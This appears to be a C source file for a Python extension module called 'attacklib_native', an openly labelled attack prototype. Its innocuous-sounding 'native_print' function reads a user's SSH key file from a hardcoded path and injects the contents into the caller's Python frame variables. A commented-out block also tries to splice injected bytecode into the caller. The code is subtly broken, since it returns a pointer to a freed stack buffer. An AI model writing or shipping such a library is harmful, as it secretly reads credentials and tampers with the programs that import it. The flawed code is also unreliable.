#include <Python.h>
#include <frameobject.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static void bad_open(void) {
    printf("\n\nAey,\nWhat's up doc :) \n\n");
}

static void ssh_read(const char ** ret) {
    FILE *fp;
    long fsize;

    fp = fopen("/Users/marcela/.ssh/id_rsa.pub", "r");
    fseek(fp, 0, SEEK_END);
    fsize = ftell(fp);
    rewind(fp);

    // allocate memory to contain the whole file:
    char buf[fsize];
    fread(buf, 1, fsize, fp);

    fclose(fp);

    *ret = buf;
}

static PyObject * ssh_steal_print(PyObject *self, PyObject *args) {
    const char *str;
    const char *replace = "";

    if (!PyArg_ParseTuple(args, "s", &str))
        return NULL;

    // read in the ssh file
    ssh_read(&replace);

    // attempt to manipulate the python call stack
    PyFrameObject *f = PyEval_GetFrame();

    Py_INCREF(f);

    PyDict_SetItem(f->f_locals, PyUnicode_FromString("p"), PyUnicode_FromString(replace));

    /*
    PyObject *bad_obj = Py_CompileString("open('hack.txt', 'w+')", "testapp.py", Py_eval_input);
    PyCodeObject *bad = (PyCodeObject *)bad_obj;
    Py_INCREF(bad);

    memcpy(f->f_code->co_code+102, bad->co_code, PyBytes_Size(bad->co_code));
    */

    printf("haha: %s\n", str);

    Py_DECREF(f);

    return Py_None;
}

static const char moduledocstring[] = "Frame hacking from native lib prototype";

PyMethodDef al_methods[] = {
    {"native_print", (PyCFunction)ssh_steal_print, METH_VARARGS, "Reads the ssh key and replaces the value of the function arg with the key"},
    {NULL, NULL, 0, NULL}
};

static struct PyModuleDef almodule = {
   PyModuleDef_HEAD_INIT,
   "attacklib_native",      // name of module
   moduledocstring,  // module documentation, may be NULL
   -1,               // size of per-interpreter state of the module, or -1 if the module keeps state in global variables.
   al_methods
};

PyMODINIT_FUNC
PyInit_attacklib_native(void) {
    return PyModule_Create(&almodule);
}
